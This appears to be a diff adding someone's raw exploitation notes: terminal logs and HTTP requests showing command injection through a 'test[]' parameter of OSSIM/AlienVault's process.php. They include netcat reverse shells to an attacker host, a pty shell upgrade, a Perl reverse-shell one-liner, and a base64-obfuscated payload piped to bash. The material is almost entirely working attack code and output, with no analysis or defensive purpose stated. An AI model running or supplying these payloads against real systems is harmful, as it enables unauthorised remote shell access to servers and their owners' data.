@@ -1,0 +1,125 @@
+#################################################################################
+root@kali:~# cat /tmp/bbb 
+uid=0(root) gid=0(root) groups=0(root)
+root@kali:~# rm /tmp/bbb 
+root@kali:~# curl  'https://aaa.php?&test['`id$IFS>/tmp/bbb`']'
+curl: (6) Could not resolve host: aaa.php
+root@kali:~# cat /tmp/bbb 
+uid=0(root) gid=0(root) groups=0(root)
+root@kali:~# rm /tmp/bbb 
+root@kali:~# wget  'https://aaa.php?&test['`id$IFS>/tmp/bbb`']'
+--2020-03-24 22:41:02--  https://aaa.php/?&test[]
+Resolving aaa.php (aaa.php)... failed: Name or service not known.
+wget: unable to resolve host address ﻗ°»aaa.phpﻗ°ﻷ
+root@kali:~# cat /tmp/bbb 
+uid=0(root) gid=0(root) groups=0(root)
+root@kali:~# 
+
+
+#################################################################################
+root@kali:~# wget  'https://aaa.php?&test['`{nc,-nvlp,4444}`']'
+listening on [any] 4444 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 41494
+
+
+#################################################################################
+root@kali:~# nc localhost 4444
+#################################################################################
+
+GET /ossim/sem/process.php?txtexport=exportEntireQuery&end=1&start=1&test['`{nc,-nv,192.168.11.129,5555,-e,/bin/sh}`'] HTTP/1.1
+Host: 192.168.11.123
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JXID=5YN9Wi6bkQn9OihqHbjcRecf; JXHID=false; PHPSESSID=e0218506371f51bb185546943b41666f
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+root@kali:~# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.11.129  netmask 255.255.255.0  broadcast 192.168.11.255
+        inet6 fe80::20c:29ff:feeb:68ac  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:eb:68:ac  txqueuelen 1000  (Ethernet)
+        RX packets 98519  bytes 101612460 (96.9 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 61165  bytes 6147993 (5.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 15549  bytes 3315099 (3.1 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 15549  bytes 3315099 (3.1 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@kali:~# nc -nvlp 5555
+listening on [any] 5555 ...
+connect to [192.168.11.129] from (UNKNOWN) [192.168.11.123] 46088
+whoami
+www-data
+
+
+#################################################################################
+
+GET /ossim/sem/process.php?txtexport=exportEntireQuery&end=1&start=1&test['`{nc,-e,/bin/sh,192.168.11.129,4444}`'] HTTP/1.1
+Host: 192.168.11.123
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: JXID=5YN9Wi6bkQn9OihqHbjcRecf; JXHID=false; PHPSESSID=e0218506371f51bb185546943b41666f
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+root@kali:~# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.11.129  netmask 255.255.255.0  broadcast 192.168.11.255
+        inet6 fe80::20c:29ff:feeb:68ac  prefixlen 64  scopeid 0x20<link>
+        ether 00:0c:29:eb:68:ac  txqueuelen 1000  (Ethernet)
+        RX packets 98143  bytes 101573473 (96.8 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 60897  bytes 6118977 (5.8 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 15109  bytes 3243555 (3.0 MiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 15109  bytes 3243555 (3.0 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+root@kali:~# nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.11.129] from (UNKNOWN) [192.168.11.123] 44442
+whoami
+www-data
+python -c 'import pty; pty.spawn("/bin/sh")'
+sh-3.2$ hostname
+hostname
+alienvault
+sh-3.2$ 
+
+
+#################################################################################
+
+IDEAS POP INTO MY MIND
+#####################################################################################################################
+perl -e 'use Socket;$i="192.168.11.129";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMS4xMjkiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo=
+#####################################################################################################################
+
+echo,-n,"cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMS4xMjkiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo=",|,base64,-d,|,bash
+
+
+
+/ossim/sem/process.php?txtexport=exportEntireQuery&end=1&start=1&test['`{echo,-n,"cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTkyLjE2OC4xMS4xMjkiOyRwPTQ0NDQ7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307Jwo=",|,base64,-d,|,bash}`']
+
+
+#############################################################################################################################################
